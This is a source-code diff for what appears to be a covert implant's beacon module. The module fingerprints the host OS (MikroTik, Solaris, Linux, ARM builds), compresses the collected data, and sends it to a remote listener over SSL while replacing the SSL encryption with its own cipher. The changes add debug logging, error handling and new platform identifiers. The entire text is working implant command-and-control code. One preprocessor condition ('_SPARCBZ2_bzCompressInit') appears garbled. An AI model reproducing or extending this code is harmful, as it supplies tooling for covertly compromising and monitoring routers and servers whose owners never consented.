@@ -1,3 +1,5 @@
+#include <stdio.h>
+
 #include "polarssl/ssl.h"
 #include "polarssl/havege.h"
 #include "polarssl/xtea.h"
@@ -7,7 +9,7 @@
 #include "run_command.h"
 #include "debug.h"
 #include "threads.h"
-#include "polarssl/crypto.h"
+#include "crypto.h"
 #include "proj_strings.h"
 #include "compat.h"
 #include "self_delete.h"
@@ -234,9 +236,10 @@ void *beacon(void* param)
 		// TODO: SendBeaconData does not handle errors returned
 		DLX(4, printf( "\tSending beacon data\n"));
 		ret = send_beacon_data(beaconInfo,secondsUp,beaconInterval);
-		if(ret == SUCCESS)
-		{
+		if(ret == SUCCESS) {
 			update_file((char*)sdfp);
+		} else {
+			DLX(4, printf( "\tSend of beacon data failed\n"));
 		}
 #ifdef __VALGRIND__
 	if ( ++counter > 10 ) goto not_reached;
@@ -307,7 +310,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	unsigned char* next_beacon_data = NULL;
 	
 	//ssl related variables for proxy
-	havege_state hs;
+	ctr_drbg_context ctr_drbg;
 	ssl_context ssl;
 	ssl_session ssn;
 
@@ -319,22 +322,31 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	//Populate Beacon Header
 #if defined MIKROTIK
 	#if defined _PPC
-	bhdr.os = htons(MIKROTIK_PPC);
-	#elif defined _MIPSBE
-	bhdr.os = htons(MIKROTIK_MIPSBE);
-	#elif defined _MIPSLE
-	bhdr.os = htons(MIKROTIK_MIPSLE);
+		bhdr.os = htons(BH_MIKROTIK_PPC);
+	#elif defined _MIPS
+		bhdr.os = htons(BH_MIKROTIK_MIPS);
+	#elif defined _MIPSEL
+		bhdr.os = htons(BH_MIKROTIK_MIPSEL);
 	#elif defined _X86
-	bhdr.os = htons(MIKROTIK_X86);
+		bhdr.os = htons(BH_MIKROTIK_X86);
 	#endif
+
 #elif defined SOLARIS
-	#if defined _SPARC
-	bhdr.os = htons(SOLARIS_SPARC);
+	#if defined _SPARCBZ2_bzCompressInit
+		bhdr.os = htons(BH_SOLARIS_SPARC);
 	#elif defined _X86
-	bhdr.os = htons(SOLARIS_X86);
+		bhdr.os = htons(BH_SOLARIS_X86);
 	#endif
+
 #elif defined LINUX
-	bhdr.os = htons(LINUX_X86);
+	#if defined _X86
+		bhdr.os = htons(BH_LINUX_X86);
+	#elif defined _X86_64
+		bhdr.os = htons(BH_LINUX_X86_64);
+	#endif
+
+#elif defined ARM
+	bhdr.os = htons(BH_ARM);
 #endif
 
 	//TODO: Change this number whenever the version changes.
@@ -523,7 +535,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	//compress packet
 	compressed_packet = compress_packet(packet,packetSize,&compressedPacketSize);
-
+	DLX(5, printf("Original packet size: %d, Compressed packet size: %d\n", packetSize, compressedPacketSize));
 	//combine compressed_packet with beacon header.
 	if(packet != NULL)
 	{
@@ -548,7 +560,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	encrypt_size = packetSize + (8 - (packetSize % 8));
 
 	//connect to the client
-	DLX(4, printf("Connecting to client...\n"));
+	DLX(4, printf("Connecting to client %s on port %d using socket: %d\n", beaconInfo->ip, beaconInfo->port, sock));
 	retval = net_connect(&sock,beaconInfo->ip, beaconInfo->port);
 
 	if ( retval != SUCCESS )
@@ -583,7 +595,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	//setup ssl
 	DLX(4, printf("\tSetup crypto\n"));
-	if(crypt_setup_client( &hs, &ssl, &ssn, &sock ) != SUCCESS)
+	if(crypt_setup_client( &ctr_drbg, &ssl, &ssn, &sock ) != SUCCESS)
 	{
 		DLX(4, printf("\tERROR: crypt_setup_client()\n"));
 		retval = FAILURE;
@@ -606,7 +618,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	DLX(4, printf("\tHandshake Complete!\n"));
 
-	//turn off the ssl encryption since we us our own
+	//turn off the ssl encryption since we use our own
 	ssl.do_crypt = 0;
 
 	//generate 32 random bytes
@@ -627,11 +639,15 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	//receive the buffer
 	memset(randData, 0, 64);
 
-	if( 0 > recv(sock,(char*)randData,37,0))
+	retval = recv(sock,(char*)randData,37,0);
+	if (retval < 0)
 	{
+		DLX(4, printf( "\tReceive failed:"));
+		perror("1");
 		retval = FAILURE;
 		goto EXIT;
 	}
+	DLX(4, printf( "\tReceived %d bytes\n", retval));
 
 	//extract the key
 	extract_key(randData + 5,key);
@@ -653,36 +669,36 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	//while we haven't sent all data keep going
 	//send size embedded in rand data
 	//send encrypted data
-	do 
-	{
+	do {
+
 		//embed the data size so the server knows how much data to read
-		if( (encrypt_size - bytes_sent) >= MAX_SSL_PACKET_SIZE)
-		{
-			sz_to_send = MAX_SSL_PACKET_SIZE;
-		} 
-		else
-		{
-			sz_to_send = encrypt_size - bytes_sent;
-		}
+		sz_to_send = (encrypt_size - bytes_sent) >= MAX_SSL_PACKET_SIZE ? MAX_SSL_PACKET_SIZE : encrypt_size - bytes_sent;
 		DLX(4, printf("\tSending: %d bytes\n", sz_to_send));
 
-		//reset the buffer
-		memset(randData, 0, 64);
-
 		retval = crypt_write( &ssl, enc_buf + bytes_sent, sz_to_send);
-		if( retval < 0)
-		{
+		if( retval < 0) {
+			DLX(4, printf("\tcrypt_write() failed with error: %0x\n", retval));
 			retval = FAILURE;
 			goto EXIT;
 		}
 
-		//receive ack
+		// Receive ACK
 		memset(recv_buf, 0, 30);
 
-		retval = recv(sock, recv_buf,30,0);
-		recv_sz = atoi(recv_buf + (sizeof(SSL_HDR) - 1));
-		bytes_sent += recv_sz;
+		retval = recv(sock, recv_buf, 30, 0);
+		if (retval < 0)
+		{
+			DLX(4, printf( "\tReceive failed:"));
+			perror("2");
+			retval = FAILURE;
+			goto EXIT;
+		}
+		DLX(4, printf( "\tReceived %d bytes\n", retval));
 
+		recv_sz = atoi(recv_buf + (sizeof(SSL_HDR) - 1));
+		DLX(4, printf("\tACKed bytes: %d\n", recv_sz));
+		bytes_sent += recv_sz;
+		DLX(4, printf("\tTotal bytes sent: %d, %d to go\n", bytes_sent, encrypt_size-bytes_sent));
 	} while (bytes_sent < encrypt_size);
 
 	retval = SUCCESS;
